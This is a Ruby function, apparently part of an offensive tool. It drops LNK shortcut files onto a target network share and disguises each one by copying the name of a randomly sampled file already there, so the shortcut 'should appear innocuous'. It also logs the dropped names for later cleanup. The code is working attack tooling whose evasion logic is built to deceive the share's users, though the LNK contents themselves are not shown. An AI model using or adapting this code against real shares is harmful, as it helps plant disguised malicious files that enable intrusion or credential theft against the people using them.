# Sample file names already on the target share and attempt
# to create a LNK file named identical to a random ample. Idea is that a LNK pointing
# to a file that already exists on the share should appear innocuous.
# Function tracks dropped LNK names to a file so that the clean
# function can be used to remove dropped LNK files.
def drop_stealth_lnk(config, sclient, share)

	listing,success = sclient.get_file_listing()

	listing.delete_if { |s| s =~ /^\.|\~|\:/i }

	if listing.count < 2

		print " [STEALTH LNK FAILURE (FALLBACK)]".yellow
		# $prompt.incind
		# $prompt.alert("Not enough files in directory to sample!", true, false)
		# $prompt.alert("Falling back to original LNK name!", true, false)
		lnkname = config.lnkname
		# $prompt.reset!(:symbol)
		# $prompt.decind

	else

		# mix up the elements
		listing.shuffle!

		# initialize variable to hold the new filename
		fname = nil

		listing.each do |f|

			next if f =~ /\.lnk$/i

			fname = f + '.lnk'

			if listing.include?(fname)
				fname = nil
				next
			else
				break
			end

		end

		if fname
			lnkname = fname
		else
			print " [STEALTH LNK FAILURE (FALLBACK)]".yellow
			lnkname = config.lnkname
			# $prompt.alert("Unable to generate stealth name!", true, false)
			# $prompt.alert("Falling back to original LNK name (#{lnkname})!", true, false)
		end

	end

	drop_lnk(config, sclient, share, lnkname)
	return lnkname

end